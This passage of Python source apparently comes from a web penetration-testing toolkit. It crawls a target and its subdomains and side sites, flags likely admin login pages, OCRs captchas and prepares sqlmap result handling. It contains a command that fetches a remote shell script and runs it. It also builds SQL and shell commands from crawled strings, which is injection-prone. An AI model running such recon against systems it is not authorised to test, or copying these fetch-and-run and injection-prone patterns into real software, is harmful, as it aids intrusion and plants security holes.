            # 查找robots.txt中可能存在的sitemap链接
            find_sitemap_link_pattern = re.compile(
                r"Sitemap:[^\S\n]*(http[\S]*)\s", re.I)
            find_sitemap_link = re.findall(find_sitemap_link_pattern, content)
            if find_sitemap_link:
                for each in find_sitemap_link:
                    all_uris.append(each)

        if re.search(r"(sitemap\.xml)$", url):
            find_url_pattern = re.compile(
                r'''(http(s)?://[^\s'"#<>]+).*\s''', re.I)
            find_url = re.findall(find_url_pattern, content)
            if find_url:
                for each in find_url:
                    all_uris.append(each[0])

    else:
        for each in bs.find_all('a'):
            # 收集a标签(bs可以收集到不带http_domain的a标签)
            find_uri = each.get('href')
            if find_uri is not None:
                if re.match(r"^javascript:", find_uri):
                    continue
                else:
                    all_uris.append(find_uri)
        # 收集src="http:..."中的uri
        for each in bs.find_all(src=True):
            find_uri = each.get('src')
            if find_uri is not None:
                all_uris.append(find_uri)

    # 整理uri,将不带http_domain的链接加上http_domain
    for each in all_uris:
        if each is not None:
            if re.match(r"^http", each) is None:
                each = get_value_from_url(url)['y2'] + '/' + each
            if each not in return_all_urls:
                return_all_urls.append(each)
    # 暂时不考虑将如http://www.baidu.com/1.php?a=1&b=2整理成http://www.baidu.com/1.php

    # 整理所有url,将其中带有单引号和双引号和+号的url过滤掉
    final_return_urls = []
    for each in return_all_urls:
        if "'" in each or '"' in each or '+' in each or "{" in each or "(" in each or "[" in each:
            pass
        else:
            final_return_urls.append(each)
    return {'y1': final_return_urls, 'y2': result}


def like_admin_login_content(html):
    # 根据html内容判断页面是否可能是管理员登录页面
    user_pass_form = get_user_and_pass_form_from_html(html)
    user_form_name = user_pass_form['user_form_name']
    pass_form_name = user_pass_form['pass_form_name']
    if user_form_name is not None and pass_form_name is not None:
        return True
    else:
        return False


def like_admin_login_url(url):
    # 判断url对应的html内容是否可能是管理员登录页面
    html = get_request(url)['content']
    return like_admin_login_content(html)


class MyThread(threading.Thread):

    def __init__(self, func, args, name=''):
        threading.Thread.__init__(self)
        self.name = name
        self.func = func
        self.args = args

    def run(self):
        self.result = self.func(*self.args)

    def get_result():
        return self.result


def get_domain_key_value_from_url(url):
    # 从url中得到域名的关键值
    # eg.从http://www.baidu.com中得到baidu
    url = re.sub(r"(\s)$", "", url)
    http_domain = get_http_domain_from_url(url)
    domain = http_domain.split("//")[-1]
    num = len(domain.split("."))
    if num == 2:
        return domain.split(".")[0]
    if num > 2:
        if domain.split(".")[1] not in [
            'com',
            'cn',
            'org',
            'gov',
            'net',
            'edu',
            'biz',
            'info',
            'me',
            'uk',
            'hk',
            'tw',
            'us',
            'it',
            'in',
            'fr',
            'de',
            'co',
            'cc',
            'cm',
            'pro',
            'br',
                'tv']:
            return domain.split(".")[1]
        else:
            return domain.split(".")[0]


def crawl_url(url):
    # 爬虫,可获取url对应网站的所有可抓取的url和所有网页三元素:code,title,content
    figlet2file("crawling url", 0, True)
    print(url)

    from colorama import init, Fore
    init(autoreset=True)
    print(Fore.BLUE + url)

    url_belong_to_main_target = [False]
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    url_main_target = [get_url_belong_main_target_domain(url)]
    # eg.www_freebuf_com_pang
    url_main_target_pang_table_name = url_main_target[
        0].replace(".", "_") + "_pang"
    # eg.www_freebuf_com_sub
    url_main_target_sub_table_name = url_main_target[
        0].replace(".", "_") + "_sub"
    current_not_main_target_table_name = []
    if url_main_target[0] == get_http_domain_from_url(url).split('/')[-1]:
        # 说明该url是目标url，不是目标的某个旁站或子站url
        table_name = [
            get_main_target_table_name(
                get_http_domain_from_url(url))]
        url_belong_to_main_target = [True]
    else:
        pang_table_exists = False
        sub_table_exists = False
        if True == exist_table_in_db(
                url_main_target_pang_table_name,
                eval(get_key_value_from_config_file('config.ini','default','db_name'))):
            pang_table_exists = True
            result1 = execute_sql_in_db(
                "select * from %s where http_domain='%s'" %
                (url_main_target_pang_table_name,
                 get_http_domain_from_url(url)),
                eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result1) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_pang_table_name)
        if True == exist_table_in_db(
                url_main_target_sub_table_name,
                eval(get_key_value_from_config_file('config.ini','default','db_name'))):
            sub_table_exists = True
            result2 = execute_sql_in_db(
                "select * from %s where http_domain='%s'" %
                (url_main_target_sub_table_name,
                 get_http_domain_from_url(url)),
                eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result2) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_sub_table_name)
            # 有种情况下,非主要目标的url存储信息的表在主要目标的旁站表和子站表中都存在,
            # 也即该url既是旁站url又是子站url,eg.wit.freebuf.com既是旁站又是子站

    urls_queue = queue.Queue()
    urls_url_keyvalues = {}
    # url和url的三个元素的对应值为一个字典的键值对
    # eg{'http://www.baiud.com':{'code':code,'title':title,'content':content},"":{},"":{},...}
    # 用于收集url与对应的三个元素的值,收集后考虑可能统一存入数据库

    # 收集相同域名网站内的urls
    domain_urls = []
    resource_files = []
    # 收集二级域名
    subdomain_urls = []

    def task_finish_func():
        while True:
            current_url = urls_queue.get()
            http_domain = get_http_domain_from_url(current_url)
            # eg.main_domain_prefix从http://www.freebuf.com中得到www
            # main_domain_key_value从http://www.freebuf.com中得到freebuf
            main_domain_prefix = re.search(
                r"http(s)?://([^\.]*)\.([^\./]*)",
                current_url).group(2)
            main_domain_key_value = re.search(
                r"http(s)?://([^\.]*)\.([^\./]*)", current_url).group(3)
            resource_file_pattern = re.compile(r"^http.*(\.(jpg)|(chm)|(jar)|(jpeg)|(gif)|(ico)|(bak)|(png)|\
(bmp)|(txt)|(doc)|(docx)|(pdf)|(txt)|(xls)|(xlsx)|(rar)|(zip)|(avi)|(mp4)|(rmvb)|(flv)|\
(m3u)|(msi)|(exe)|(com)|(pif)|(mp3)|(wav)|(mkv)|(7z)|(gz)|(htaccess)|(ini)|(xml)|(key)|\
(dll)|(css)|(cab)|(bin)|(js))$", re.I)
            result = collect_urls_from_url(current_url)
            code = result['y2']['code']
            title = result['y2']['title']
            content = result['y2']['content']
            if content is None:
                print("exist None value of content")
                continue
            # eg:www.baidu.com_urls or www.baidupangzhan.com_urls
            target_or_pang_or_sub_urls_table_name = get_http_domain_from_url(
                current_url).split('/')[-1].replace(".", "_") + "_urls"
            '''
            # 取消targets和first_targets表中的各个如urls,dirb,cms_value等列,将详细信息存在如www_freebuf_com_pang
            # 表中,targets或first_targets表中只存放主目标(也即非旁站目标)包括该主目标的所有旁站的扫描完成情况
            if url_belong_to_main_target[0]==True:
                # 得到的url要存放到urls列,eg.在targets表和www_freebuf_com_pang表中都有
                # http_domain='http://www.freebuf.com'对应的urls列,这样要在两个表中的urls都填上此处的url
                # www.freebuf.com的旁站eg.http://bar.freebuf.com只要在www_freebuf_com_pang表中的urls列中填写此处
                # 的url,targets表或first_targets表中没有旁站bar.freebuf.com对应的项目
                auto_write_string_to_sql(current_url,eval(get_key_value_from_config_file('config.ini','default','db_name')),table_name[0],"urls","http_domain",http_domain)
            '''
            # 下面将当前url写入如www_freebuf_com_pang或www_freebuf_com_sub表的urls列中
            if url_belong_to_main_target[0]:
                auto_write_string_to_sql(current_url, eval(get_key_value_from_config_file('config.ini','default','db_name')), table_name[
                                         0], "urls", "http_domain", http_domain)

                if like_admin_login_content(content):
                    auto_write_string_to_sql(
                        current_url,
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        table_name[0],
                        "like_admin_login_urls",
                        "http_domain",
                        http_domain)
                    execute_sql_in_db(
                        "update %s set like_admin_login_url='1' where url='%s'" %
                        (target_or_pang_or_sub_urls_table_name, current_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
                else:
                    execute_sql_in_db(
                        "update %s set like_admin_login_url='0' where url='%s'" %
                        (target_or_pang_or_sub_urls_table_name, current_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))

            else:
                # 当前url不是直接主要目标domain的url,如http://wit.freebuf.com/1.php
                for each in current_not_main_target_table_name:
                    # 如果current_not_main_target_table_name列表中只有一个(url是旁站或子站)
                    # 如果....2个(url是旁站又是子站)
                    auto_write_string_to_sql(
                        current_url,
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        each,
                        "urls",
                        "http_domain",
                        http_domain)

                    if like_admin_login_content(content):
                        auto_write_string_to_sql(
                            current_url,
                            eval(get_key_value_from_config_file('config.ini','default','db_name')),
                            each,
                            "like_admin_login_urls",
                            "http_domain",
                            http_domain)
                        execute_sql_in_db(
                            "update %s set like_admin_login_url='1' where url='%s'" %
                            (target_or_pang_or_sub_urls_table_name, current_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))
                    else:
                        execute_sql_in_db(
                            "update %s set like_admin_login_url='0' where url='%s'" %
                            (target_or_pang_or_sub_urls_table_name, current_url), eval(get_key_value_from_config_file('config.ini','default','db_name')))

            auto_write_string_to_sql(
                str(code),
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_or_pang_or_sub_urls_table_name,
                "code",
                "url",
                current_url)
            auto_write_string_to_sql(
                title,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_or_pang_or_sub_urls_table_name,
                "title",
                "url",
                current_url)
            auto_write_string_to_sql(
                content,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                target_or_pang_or_sub_urls_table_name,
                "content",
                "url",
                current_url)

            urls = result['y1']
            for each in urls:
                # collect_urls_from_url得到的结果中的元素可能是None
                if each is not None:
                    tmp = get_http_domain_pattern_from_url(http_domain)
                    http_domain_pattern = re.compile(r"%s" % tmp)
                    if re.match(http_domain_pattern, each):
                        each = re.sub(r"/$", "", each)

                        if re.match(resource_file_pattern, each):
                            if each not in resource_files:
                                # 资源类型文件不放入任务队列里,直接写到数据库中
                                resource_files.append(each)
                                if url_belong_to_main_target[0] == True:
                                    auto_write_string_to_sql(
                                        each,
                                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                                        table_name[0],
                                        "resource_files",
                                        "http_domain",
                                        http_domain)

                                else:
                                    for each_table in current_not_main_target_table_name:
                                        auto_write_string_to_sql(
                                            each, eval(get_key_value_from_config_file('config.ini','default','db_name')), each_table, "resource_files", "http_domain", http_domain)
                        else:
                            if each not in domain_urls:
                                # print each
                                domain_urls.append(each)
                                # print domain_urls
                                urls_queue.put(each)
                    if re.match(
                        r"http(s)?://[^\.]*(?<!%s)\.%s" %
                        (main_domain_prefix,
                         main_domain_key_value),
                            each) and get_domain_key_value_from_url(each) == get_domain_key_value_from_url(current_url):
                        each_subdomain = get_http_domain_from_url(each)
                        if each_subdomain not in subdomain_urls:
                            # 二级域名只将http_domain部分写入targets或first_targets表中
                            # 此处暂存于列表中,最后统一存入数据库和本地文件中
                            subdomain_urls.append(each_subdomain)
            # 将所有结果存一份在字典中，暂时没有什么用
            urls_url_keyvalues['%s' % url] = result['y2']
            urls_queue.task_done()

    # 初始化
    url = re.sub(r"(/{0,2}(\s){0,2})$", "", url)
    http_domain = get_http_domain_from_url(url)
    start_urls = [url]
    if url != http_domain:
        start_urls.append(http_domain)

    robots_txt_url = http_domain + "/robots.txt"
    result = get_request(robots_txt_url)
    if result['code'] == 200 and len(result['content']) > 0:
        start_urls.append(robots_txt_url)
        content = result['content']
        strings_to_write = "robots.txt exists,content is:\r\n" + content
        if url_belong_to_main_target[0]:
            # 如果是主目标url
            auto_write_string_to_sql(
                strings_to_write,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                table_name[0],
                "robots_and_sitemap",
                "http_domain",
                http_domain)
        else:
            # 如果不是主目标url
            for each in current_not_main_target_table_name:
                auto_write_string_to_sql(
                    strings_to_write,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    each,
                    "robots_and_sitemap",
                    "http_domain",
                    http_domain)

    sitemap_xml_url = http_domain + "/sitemap.xml"
    result = get_request(sitemap_xml_url)
    if result['code'] == 200 and len(result['content']) > 0:
        start_urls.append(sitemap_xml_url)
        content = result['content']
        strings_to_write = "sitemap.xml exists,content is:\r\n" + content
        if url_belong_to_main_target[0]:
            auto_write_string_to_sql(
                strings_to_write,
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                table_name[0],
                "robots_and_sitemap",
                "http_domain",
                http_domain)
        else:
            for each in current_not_main_target_table_name:
                auto_write_string_to_sql(
                    strings_to_write,
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    each,
                    "robots_and_sitemap",
                    "http_domain",
                    http_domain)

    for each in start_urls:
        print(each)
        domain_urls.append(each)
        urls_queue.put(each)

    '''传统多线程
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print("%s threads started" % str(i))
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    # upon threads=200 ===> 38,16
    # threads=5 ===> 12,16
    # threads=10 4,16
    # threads=15 3.4,16
    '''

    '''单线程
    start=time.time()
    task_finish_func()
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    # thread=1 task_finish_func中while True改成while urls_queue.empty() is False,要不然不会执行到最后   19.4,16
    '''

    mythreads = []
    start = time.time()
    pool = ThreadPool(15)
    for i in range(15):
        # 这里比较特殊,因为函数task_finish_func是个无限循环的函数,所以就算这里开20个线程也会因为线程池中只有15\
        # 个位置使得一直只有15个线程在运行,多余的5个线程相当于没有设置一样
        pool.apply_async(task_finish_func, ())
    pool.close()

    while 1:
        # 这里的if取代下面的urls_queue.join(),有时爬虫被ban时,如果用urls_queue.join()会无限等待
        num_of_result = len(domain_urls)
        # 实验中15s是较好的数据
        sleep(15)
        if len(domain_urls) == num_of_result:
            print(
                Fore.BLUE +
                "finished,if the number of urls you get is not big enough,you may be banned to crawl :(")
            break
    # urls_queue.join()
    end = time.time()
    print(end - start)
    print(len(domain_urls))
    # auto_write_string_to_sql("1",eval(get_key_value_from_config_file('config.ini','default','db_name')),target_urls_table_name)
    # threads=15(pool_size=15,for_range=20) 4.15,16
    # threads=20(pool_size=20,for_range=20) 9.2,16
    # threads=10(pool_size=10,for_range=20) 4.2,16

    # 处理子站,将爬虫爬到的子站存入数据库和本地文件中,但是爬虫爬到的子站不再爬,因为事先有专门的子站获取模块,如
    # 果此处的自己的爬虫模块在爬到新的子站也新建urls表并爬虫,则有可能爬很久,况且事先的专门的子站获取模块应该可
    # 以得到所有的子站,这里的自己的爬虫模块便不再爬新的子站了,也不建立新的子站urls表,只作收录,
    # 不直接爬这个新的子站,以后如果有需求再爬

    sql = "select http_domain from %s" % url_main_target_sub_table_name
    result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    sub_domain_list = []
    if len(result) > 0:
        for http_domain_in_db in result:
            sub_domain_list.append(http_domain_in_db[0])
    else:
        print("%s error" % sql)

    for each in subdomain_urls:
        # subdomain_urls中存放的是http+domain格式的列表
        if url_belong_to_main_target[0]:
            # 此时当前爬虫目标是主要目标
            if each not in sub_domain_list:

                # 将新的子站存入本地文件
                os.system(
                    "echo %s >> %s" %
                    (each.split("/")[-1], "log/sub/" + url_main_target_sub_table_name + ".txt"))

                if each != url_main_target[0]:
                    # 如果不为主要目标则存入数据库
                    auto_write_string_to_sql(
                        each.split("/")[-1],
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        table_name[0],
                        "sub_domains",
                        "http_domain",
                        get_http_domain_from_url(url))
                    sql = "insert ignore into %s(http_domain,domain) values('%s','%s')" % (
                        url_main_target_sub_table_name, each, each.split("/")[-1])
                    execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        else:
            # 只有当前爬虫的目标是属于主要目标才将子站存入数据库和本地文件,旁站和子站目标如wit.freebuf.com在
            # crawl_url函数中不爬,在crawl_scan中会根据scan_way来采取不同爬虫方法
            pass


def crawl_scan(target):
    # target是主要目标
    # 对target目标的爬虫扫描,称为爬虫扫描而不是爬虫是因为这里不只是对一个eg.http://www.freebuf.com的扫描
    # 而是根据scan_way来对目标以及目标的旁站或子站的爬虫
    # target要求是http格式
    main_target_table_name = get_main_target_table_name(target)

    http_domain_sqli_scaned = get_scan_finished(
        "crawl_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    pang_domains_crawl_scaned = get_scan_finished(
        "pang_domains_crawl_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_crawl_scaned = get_scan_finished(
        "sub_domains_crawl_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_sqli_scaned == 0:
        crawl_url(target)
        set_scan_finished(
            "crawl_scaned",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
            target)
    elif http_domain_sqli_scaned == 1:
        print("main target crawl_scaned")
        pass
    else:
        print("get_scan_finished error in crawl_scan func")
    if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
        if pang_domains_crawl_scaned == 1:
            return
        # 从数据库中获取target的旁站列表
        sql = "select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_pang"
        result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    crawl_scaned = get_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_pang", each[0])
                    if crawl_scaned == 0:
                        crawl_url(each[0])
                        set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                else:
                    print("crawl_scan func's each[0] error in scan_way 1")
            set_scan_finished("pang_domains_crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                              main_target_table_name, target)
        else:
            print("crawl_scan func's %s error" % sql)
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
        if sub_domains_crawl_scaned == 1:
            return
        # 从数据库中获取target的子站列表
        sql = "select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_sub"
        result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    crawl_scaned = get_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_sub", each[0])
                    if crawl_scaned == 0:
                        crawl_url(each[0])
                        set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                else:
                    print("crawl_scan func's each[0] error in scan_way 2")
                set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                    "/")[-1].replace(".", "_") + "_sub", each[0])
            set_scan_finished("sub_domains_crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                              main_target_table_name, target)
        else:
            print("crawl_scan func's %s error" % sql)
    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
        # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
        # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
        # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

        # 从数据库中获取target的旁站列表
        if pang_domains_crawl_scaned == 1 and sub_domains_crawl_scaned == 1:
            return
        pang_list = []
        sql = "select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_pang"
        result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                if each[0] != "":
                    pang_list.append(each[0])
                    crawl_scaned = get_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_pang", each[0])
                    if crawl_scaned == 0:
                        crawl_url(each[0])
                        set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                else:
                    print("crawl_scan func's each[0] error in scan_way 3")
            set_scan_finished("pang_domains_crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                              main_target_table_name, target)
        else:
            print("crawl_scan func's %s error" % sql)

        # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
        sql = "select http_domain from %s" % target.split(
            "/")[-1].replace(".", "_") + "_sub"
        result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(result) > 0:
            for each in result:
                if each[0] != "" and each[0] not in pang_list:
                    crawl_scaned = get_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_sub", each[0])
                    if crawl_scaned == 0:
                        crawl_url(each[0])
                        set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                elif each[0] in pang_list:
                    print(
                        "%s is pang domain and sub domain and will not crawl in sub domain table since \
it has crawled in pang domain table" %
                        each[0])
                    set_scan_finished("crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                        "/")[-1].replace(".", "_") + "_sub", each[0])
                else:
                    print("crawl_scan func's each[0] error in scan_way 3")
            set_scan_finished("sub_domains_crawl_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')),
                              main_target_table_name, target)
        else:
            print("crawl_scan func's %s error" % sql)

    elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
        pass
    else:
        print("scan_way error in crawl_scan")


def get_string_from_command(command):
    # 执行命令并得到命令执行打印出的字符串,不会显示执行命令中的输出
    import subprocess
    return subprocess.getstatusoutput(command)[1]


def get_yanzhengma_from_pic(img, cleanup=True, plus=''):
    # 调用系统安装的tesseract来识别验证码
    # cleanup为True则识别完成后删除生成的文本文件
    # plus参数为给tesseract的附加高级参数
    # print get_string_from_yanzhengma('2.jpg')  # 打印识别出的文本,删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False)  # 打印识别出的文本,不删除txt文件
    # print get_string_from_yanzhengma('2.jpg', False, '-l eng')  #
    # 打印识别出的文本,不删除txt文件,同时提供高级参数
    command_output = get_string_from_command("which tesseract")
    if re.search(r'tesseract not found', command_output):
        os.system(
            "wget https://raw.githubusercontent.com/3xp10it/mytools/master/install_tesseract.sh")
        os.system("chmod +x install_tesseract.sh")
        os.system("./install_tesseract.sh")
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件
    else:
        get_string_from_command(
            'tesseract ' +
            img +
            ' ' +
            img +
            ' ' +
            plus)  # 生成同名txt文件

    text = file(img + '.txt').read().strip()
    if cleanup:
        os.remove(img + '.txt')
    return text


def get_string_from_url_or_picfile(url_or_picfile):
    # 从url或图片文件中得到验证码,不支持jpeg,支持png
    from PIL import Image
    import ImageEnhance
    # from pytesseract import *
    from urllib.request import urlretrieve

    def get_pic_from_url(url, save_pic_name):
        # 这里不打印wget的执行过程
        get_string_from_command("wget %s -O temp.png" % url)

    if url_or_picfile[:4] == "http":
        get_pic_from_url(url_or_picfile, 'temp.png')
        im = Image.open("temp.png")
    else:
        im = Image.open(url_or_picfile)

    nx, ny = im.size
    im2 = im.resize((int(nx * 5), int(ny * 5)), Image.BICUBIC)
    im2.save("temp2.png")

    # 下面这两句会在电脑上打开temp2.png
    # enh = ImageEnhance.Contrast(im)
    # enh.enhance(1.3).show("30% more contrast")
    string = get_yanzhengma_from_pic("temp2.png")
    get_string_from_command("rm temp.png temp2.png")
    return string


def mail_msg_to(msg, mailto, subject, user, password, format='plain'):
    # 使用163的邮箱发送邮件
    # msg是要发送的string
    # mailto是发送的目标邮箱地址
    # subject是主题名
    # user,password是用户名密码,其中user要带上邮箱地址后缀

    import smtplib
    from email.mime.text import MIMEText
    from email.header import Header

    host = 'smtp.163.com'
    fromMail = user
    body = msg
    if isinstance(body, str) is True:
        body = str(body)
    me = ("%s<" + fromMail + ">") % (Header('naruto', 'utf-8'),)
    msg = MIMEText(body, format, 'utf-8')
    if not isinstance(subject, str):
        subject = str(subject)
    msg['Subject'] = subject
    msg['From'] = me
    msg['To'] = mailto
    msg["Accept-Language"] = "zh-CN"
    msg["Accept-Charset"] = "ISO-8859-1,utf-8"
    try:
        s = smtplib.SMTP()
        s.connect(host)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.set_debuglevel(3)
        s.login(user, password)
        s.sendmail(me, mailto, msg.as_string())
        s.quit()
        return True
    except Exception as e:
        print(str(e))
        return False


def get_input_intime(default_choose, timeout=5):
    # 在一定时间内得到选择的值,如果没有选择则返回默认选择
    # 第一个参数为默认选择值
    # 第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    # 返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型
    import readline
    default_choose = [default_choose]
    timeout = [timeout]
    choosed = [0]
    chioce = ['']

    def print_time_func():
        while choosed[0] == 0 and timeout[0] > 0:
            time.sleep(1)
            sys.stdout.write('\r' + ' ' * (len(readline.get_line_buffer()) + 2) + '\r')
            print("%s seconds left...please input your chioce:>" % timeout[0])
            sys.stdout.write('> ' + readline.get_line_buffer())
            sys.stdout.flush()
            timeout[0] -= 1
        if choosed[0] == 0:
            chioce[0] = default_choose[0]

    def input_func():
        while choosed[0] == 0 and timeout[0] > 0:
            s = input('> ')
            # rlist, _, _ = select([sys.stdin], [], [], timeout[0])

            if len(s) == 0:
                chioce[0] = default_choose[0]
                choosed[0] = 1
                print("you choosed the default chioce:%s" % default_choose[0])
            else:
                chioce[0] = s
                choosed[0] = 1
                print("you choosed %s" % chioce[0])

    time_left_thread = MyThread(print_time_func, ())
    input_thread = MyThread(input_func, ())
    time_left_thread.start()
    # input_thread.setDaemon(True)
    input_thread.start()
    time_left_thread.join()
    if choosed[0] == 0:
        print("i choose the default chioce for you:%s" % chioce[0])
    return chioce[0]


def checkvpn():
    # 检测vpn是否连接成功
    import os
    import re
    # windows:-n 2
    # linux:-c 2
    a = 'ping www.google.com.hk -c 2'
    r = os.popen(a)
    output = r.readlines()
    # print output
    output = "".join(output)
    p = re.compile(r'ttl=', re.I)
    if p.findall(output):
        # print "ok"
        return 1
    else:
        return 0


def get_source_main_target_domain_of_pang_url(url):
    # 得到旁站所属的doamin
    import socket
    import re
    import os
    sqli_url_domain = re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)', "", url)
    targets_list = []
    result = execute_sql_in_db("show tables", eval(get_key_value_from_config_file('config.ini','default','db_name')))
    for each in result:
        if each[0] in [
                eval(get_key_value_from_config_file('config.ini','default','targets_table_name')),
                eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))]:
            result = execute_sql_in_db(
                "select domain from %s" %
                each[0], eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] not in targets_list:
                        targets_list.append(each[0])
            else:
                print(
                    "get_source_main_target_domain_of_pang_url can not get any main target")
    all_list = []
    for each in targets_list:
        each = re.sub(r'(\s)$', "", each)
        domain = []
        domain.append(each)
        try:
            all_nics_ip = socket.gethostbyname_ex(each)[2]
            each_list = all_nics_ip + domain
            all_list.append(each_list)
        except:
            pass
    # print all_list
    for single_list in all_list:
        try:
            sqli_url_ip = socket.gethostbyname_ex(sqli_url_domain)[2]
            # print sqli_url_ip
            # print 55555555
            # print single_list
            if sqli_url_ip[0] in single_list:
                # print 66666666
                # print single_list[-1]
                return single_list[-1]
        except:
            return None


def get_source_main_target_domain_of_sub_url(url):
    # 得到子站url对应的主要目标的域名
    # eg.得到http://wit.freebuf.com/1.php对应的结果为数据库中的www.freebuf.com
    http_domain = get_http_domain_from_url(url)
    result1 = execute_sql_in_db(
        "select domain from %s" %
        (eval(get_key_value_from_config_file('config.ini','default','targets_table_name'))),
        eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result1) > 0:
        for each in result1:
            if get_root_domain(each[0]) == get_root_domain(http_domain):
                return each[0]
    result2 = execute_sql_in_db(
        "select domain from %s" %
        (eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name'))),
        eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result2) > 0:
        for each in result2:
            if get_root_domain(each[0]) == get_root_domain(http_domain):
                return each[0]

    print("get_source_main_target_domain_of_sub_url func execute_sql_in_db error")
    return None


def get_url_belong_main_target_domain(url):
    # 结合get_source_main_target_domain_of_pang_url和get_source_main_target_domain_of_sub_url函数得到当前url所属
    # 的主目标的域名,如得到http://wit.freebuf.com/1.php的所属主目标为www.freebuf.com
    sub_main = get_source_main_target_domain_of_sub_url(url)
    if sub_main is not None:
        return sub_main
    else:
        pang_main = get_source_main_target_domain_of_pang_url(url)
        if pang_main is not None:
            return pang_main
    print("get_url_belong_main_target_domain func error,check it")


def get_sqlmap_result_and_save_result(url):
    # 得到sqlmap对url对应target的扫描结果,并将相关结果存入数据库
    # url可以是包含http形式的url，也可以是纯domain形式
    # py3
    # 这个import有可能会因为最开始有过import相同文件的动作而两次的文件不同,导致自己的罗辑错误
    # 这里的import要求是有配置参数的config
    source_domain = get_url_belong_main_target_domain(url)
    sql1 = "select http_domain from %s where domain='%s'" % (
        eval(get_key_value_from_config_file('config.ini','default','targets_table_name')), source_domain)
    sql2 = "select http_domain from %s where domain='%s'" % (
        eval(get_key_value_from_config_file('config.ini','default','first_targets_table_name')), source_domain)
    sql_result1 = execute_sql_in_db(sql1, eval(get_key_value_from_config_file('config.ini','default','db_name')))
